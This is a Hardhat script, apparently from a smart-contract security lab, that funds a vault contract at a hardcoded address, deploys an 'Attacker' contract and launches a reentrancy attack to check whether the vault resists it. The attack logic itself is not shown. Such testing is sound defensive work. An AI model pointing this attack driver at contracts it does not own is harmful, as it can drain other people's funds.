const { ethers } = require("hardhat");

async function main() {
  // 🎯 CHANGE THIS ADDRESS: Paste your SecureVault (or VulnerableVault) address here!
  const TARGET_VAULT_ADDRESS = "0x43a4B9049cF78642539b2e6e6a58330b30dB1689";

  // 1. Get the target contract
  // Note: We can use the "VulnerableVault" ABI for both, because both contracts have identical deposit/withdraw functions!
  const targetVault = await ethers.getContractAt("VulnerableVault", TARGET_VAULT_ADDRESS);

  console.log(`1. Funding the target vault (${TARGET_VAULT_ADDRESS}) with 0.005 ETH...`);
  const fundTx = await targetVault.deposit({ value: ethers.parseEther("0.005") });
  await fundTx.wait();
  console.log("✅ Vault funded! It now has money to test.");

  // 2. Deploy the Attacker contract
  console.log("\n2. Deploying Attacker contract...");
  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(TARGET_VAULT_ADDRESS);
  await attacker.waitForDeployment();
  const attackerAddress = await attacker.getAddress();
  console.log("✅ Attacker deployed to:", attackerAddress);

  // 3. Launch the Attack
  console.log("\n3. Launching the Reentrancy Attack with 0.001 ETH...");
  console.log("⚔️ Attack transaction submitted. Waiting for network confirmation...");

  try {
    // We attempt the attack
    const attackTx = await attacker.attack({ 
        value: ethers.parseEther("0.001"),
        gasLimit: 500000 
    });

    const receipt = await attackTx.wait();

    // If we reach this line, the transaction didn't fail. The money was stolen!
    console.log("\n=========================================");
    console.log("🚨 EXPLOIT SUCCESSFUL: THIS CONTRACT IS VULNERABLE!");
    console.log("=========================================");
    console.log("Transaction Hash:", receipt.hash);
    console.log("=========================================");

  } catch (error) {
    // If the network REVERTS the transaction (because of ReentrancyGuard), it lands here!
    console.log("\n=========================================");
    console.log("🛡️ HACK BLOCKED: THIS CONTRACT IS SECURE!");
    console.log("=========================================");
    console.log("The EVM violently reverted the hacker's transaction.");
    console.log("Your nonReentrant modifier and CEI pattern worked perfectly.");
    console.log("=========================================");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});